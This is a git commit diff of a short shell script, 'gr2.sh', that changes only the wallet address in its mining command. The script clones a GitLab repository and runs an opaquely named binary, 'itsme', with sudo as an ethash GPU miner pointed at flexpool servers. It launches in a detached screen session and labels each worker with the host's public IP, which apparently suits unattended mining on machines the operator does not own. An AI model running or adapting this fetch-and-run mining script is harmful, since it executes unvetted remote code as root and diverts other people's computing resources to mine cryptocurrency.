8d1be4a78c22b223a742aee8cabdf143558666d9
Treecommon <103907893+Treecommon@users.noreply.github.com>
2022-04-18 07:37:40 +0700

    Update gr2.sh

--- gr2.sh
+++ gr2.sh
@@ -6,4 +6,4 @@ screen -dmS sahuman.sh 65 75
 sudo git clone https://gitlab.com/taufiqurrohmanmaz/sainame127.git
 cd sainame127
 chmod +x itsme
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./itsme -a ethash -w 0x0F8824d694772df58840EDdD06a36526A0063438 -p stratum+tcp://eth-hk.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io -r $ip --nvidia 1
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./itsme -a ethash -w 0x3D02F7B8DCB18E778fE35bf8B5A7F91d819bF0C4 -p stratum+tcp://eth-hk.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io -r $ip --nvidia 1
